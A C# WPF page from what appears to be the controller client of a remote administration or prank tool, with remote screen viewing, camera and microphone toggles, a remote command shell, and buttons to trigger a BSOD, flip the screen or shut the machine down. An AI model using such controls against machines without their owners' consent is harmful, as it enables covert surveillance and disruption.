using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media.Imaging;
using Wpf.Ui.Controls;
using Image = System.Drawing.Image;

namespace Client2.Views.Pages
{

    public partial class ConnectionPage : Page
    {
        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);

        public Connection _connection;

        private const double HeaderHeight = 55;
        private const double FooterHeight = 40;

        MainWindow window;


        private const string Prompt = @"C:\>";
        private static string outp = null;
        private int _promptStartIndex;

        public ConnectionPage()
        {
            InitializeComponent();
            Loaded += ConnectionPage_Loaded;
            SizeChanged += ConnectionPage_SizeChanged;
            resolutionBox.SelectedIndex = 0;
            resolutionBox.SelectionChanged += resolutionBox_SelectionChanged;
            

            string ip = NavigationParameters.Ip;
            int port = NavigationParameters.Port;
            string password = NavigationParameters.Password;

            window = NavigationParameters.Window;

            var sw = Stopwatch.StartNew();
            _connection = new Connection(ip, port, password, this, window);
            sw.Stop();
            Console.WriteLine($"ConnectToServer took {sw.ElapsedMilliseconds} ms");

            

            Connection.ScreenUpdated += OnScreenUpdated;
            Connection.CameraUpdated += OnCameraUpdated;
            Connection.PingUpdated += OnPingUpdated;
            Connection.Cmd += OnCmdOutput;

            ipaddressinfo.Text = "ip: " + ip;

            InitializeCmd();

            Task.Run(async () =>
            {
                while (true)
                {
                    if (outp != null)
                    {

                        Dispatcher.Invoke(() =>
                        {
                            if (outp == "")
                                CmdTextBox.Text += "\n" + outp + Prompt;
                            else
                                CmdTextBox.Text += "\n" + outp + "\n" + Prompt;

                            CmdTextBox.CaretIndex = CmdTextBox.Text.Length;
                            _promptStartIndex = CmdTextBox.Text.Length;
                        });


                        outp = null;
                    }
                    await Task.Delay(100);
                }
            });
        }

        private void OnPingUpdated(long ms)
        {
            Dispatcher.Invoke(() =>
            {
                pinginfo.Text = "ping: " + ms + "ms";
            });
            
        }

        private void OnScreenUpdated(Image image)
        {
            Dispatcher.Invoke(() =>
            {
                pictureBoxScreen.Source = ConvertToBitmapImage(image);
            });
        }


        private void OnCameraUpdated(Image image)
        {
            Dispatcher.Invoke(() =>
            {
                //CameraImage.Source = ConvertToBitmapImage(image);
            });
        }



        private static BitmapSource ConvertToBitmapImage(Image image)
        {
            if (image is not Bitmap bitmap)
            {
                Console.WriteLine(image.GetType().ToString());
                bitmap = new Bitmap(image);
            }

            IntPtr hBitmap = bitmap.GetHbitmap(); // Unmanaged resource

            BitmapSource bitmapSource = Imaging.CreateBitmapSourceFromHBitmap(
                hBitmap,
                IntPtr.Zero,
                Int32Rect.Empty,
                BitmapSizeOptions.FromEmptyOptions());

            DeleteObject(hBitmap); // Free unmanaged memory

            return bitmapSource;
        }


        private void ConnectionPage_Loaded(object sender, RoutedEventArgs e)
        {
            AdjustContentSize();
        }

        private void ConnectionPage_SizeChanged(object sender, SizeChangedEventArgs e)
        {
            AdjustContentSize();
        }

        public void AdjustContentSize()
        {
            double HeaderHeight = 55, FooterHeight = 40;
            double availableHeight = ActualHeight - HeaderHeight - FooterHeight;
            if (availableHeight > 0)
            {
                MainGrid.RowDefinitions[1].Height = new GridLength(availableHeight, GridUnitType.Pixel);
            }
        }

        private void MicBtn_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Wpf.Ui.Controls.MenuItem menuItem)
            {
                if (menuItem.Icon is SymbolIcon symbolIcon)
                {
                    bool isOn = symbolIcon.Symbol != SymbolRegular.Mic24;

                    symbolIcon.Symbol = symbolIcon.Symbol == SymbolRegular.Mic24
                        ? SymbolRegular.MicOff24
                        : SymbolRegular.Mic24;

                    _connection.Mic(isOn);
                }
            }
        }

        private void SpeakerBtn_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Wpf.Ui.Controls.MenuItem menuItem)
            {
                if (menuItem.Icon is SymbolIcon symbolIcon)
                {
                    bool isOn = symbolIcon.Symbol != SymbolRegular.Speaker224;

                    symbolIcon.Symbol = symbolIcon.Symbol == SymbolRegular.Speaker224
                        ? SymbolRegular.SpeakerOff24
                        : SymbolRegular.Speaker224;

                    _connection.Speaker(isOn);
                }
            }
        }

        private void CamBtn_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Wpf.Ui.Controls.MenuItem menuItem)
            {
                if (menuItem.Icon is SymbolIcon symbolIcon)
                {
                    bool isOn = symbolIcon.Symbol != SymbolRegular.Camera24;

                    symbolIcon.Symbol = symbolIcon.Symbol == SymbolRegular.Camera24
                        ? SymbolRegular.CameraOff24
                        : SymbolRegular.Camera24;

                    if (isOn)
                    {
                        System.Windows.MessageBox.Show("Speaker is on");
                    }
                    else
                    {
                        System.Windows.MessageBox.Show("Speaker is !on");
                    }
                }
            }
        }

        private void ReconnectBtn_Click(object sender, RoutedEventArgs e)
        {
            _connection.Reconnect();
        }

        private void DisconnectBtn_Click(object sender, RoutedEventArgs e)
        {
            window.RootNavigation.Navigate(typeof(MainPage));
            _connection.Disconnect();
            _connection = null;
        }

        private void fps_slider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            if (_connection != null)
            {
                Connection.ChangeFps((int)fps_slider.Value);
            }
        }

        private void compression_slider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            if (_connection != null)
            {
                Connection.Compression((int)compression_slider.Value);
            }
        }

        private void OpenWeb_Click(object sender, RoutedEventArgs e)
        {
            _connection.OpenWeb();
        }

        private void OpenTray_Click(object sender, RoutedEventArgs e)
        {
            _connection.OpenCdTray();
        }

        private void BSOD_Click(object sender, RoutedEventArgs e)
        {
            _connection.SendBSOD();
        }

        private void SendMsg_Click(object sender, RoutedEventArgs e)
        {
            _connection.SendMsg();
        }

        private void Shutdown_Click(object sender, RoutedEventArgs e)
        {
            _connection.Shutdown();
        }

        private void Restart_Click(object sender, RoutedEventArgs e)
        {
            _connection.Restart();
        }

        private void LogOut_Click(object sender, RoutedEventArgs e)
        {
            _connection.LogOut();
        }

        private void Sleep_Click(object sender, RoutedEventArgs e)
        {
            _connection.Sleep();
        }

        private async void SysInfo_Click(object sender, RoutedEventArgs e)
        {

            SystemInfo sys = new SystemInfo(await _connection.SysInfo());
            sys.Show();
        }

        private void flipScr_Click(object sender, RoutedEventArgs e)
        {
            _connection.FlipScreen();
        }

        private void invertScr_Click(object sender, RoutedEventArgs e)
        {
            _connection.InvertScreen();
        }

        private void SendTTS_Click(object sender, RoutedEventArgs e)
        {
            _connection.SendTTS();
        }

        private void resolutionBox_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (resolutionBox.SelectedItem is ComboBoxItem item)
            {
                string resolution = item.Content.ToString().Replace("x", "|");

                Connection.ChangeResolution(resolution);
            }
        }

        private void RestartServerBtn_Click(object sender, RoutedEventArgs e)
        {
            _ = _connection.RestartServer();
        }


        private void OnCmdOutput(string output)
        {
            outp = output;
        }


        private void InitializeCmd()
        {
            CmdTextBox.Text = Prompt;
            _promptStartIndex = CmdTextBox.Text.Length;
            CmdTextBox.Focus();
            CmdTextBox.CaretIndex = _promptStartIndex;


        }

        private async void CmdTextBox_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            // Prevent moving caret before prompt
            if (CmdTextBox.CaretIndex < _promptStartIndex &&
                e.Key != Key.Left && e.Key != Key.Right && e.Key != Key.Up && e.Key != Key.Down)
            {
                e.Handled = true;
                CmdTextBox.CaretIndex = CmdTextBox.Text.Length;
                return;
            }

            // Prevent backspacing into the prompt
            if (e.Key == Key.Back && CmdTextBox.CaretIndex <= _promptStartIndex)
            {
                e.Handled = true;
                return;
            }

            // Prevent deleting prompt
            if (e.Key == Key.Delete && CmdTextBox.CaretIndex < _promptStartIndex)
            {
                e.Handled = true;
                return;
            }

            // Handle Enter (simulate command execution)
            if (e.Key == Key.Enter)
            {
                e.Handled = true;

                string fullText = CmdTextBox.Text;
                string input = fullText.Substring(_promptStartIndex).Trim();

                if (input == "cls")
                {
                    InitializeCmd();
                }
                else
                {
                    await Connection.SendData("cmd|" + input);
                }
            }
        }


        private void CmdTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            CmdTextBox.CaretIndex = CmdTextBox.Text.Length;
        }

        private void CmdTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            // Prevent programmatic edits from altering the prompt
            if (CmdTextBox.CaretIndex < _promptStartIndex)
            {
                CmdTextBox.CaretIndex = CmdTextBox.Text.Length;
            }
        }


    }

    public static class NavigationParameters
    {
        public static string Ip { get; set; }
        public static int Port { get; set; }
        public static string Password { get; set; }
        public static MainWindow Window { get; set; }

    }
}
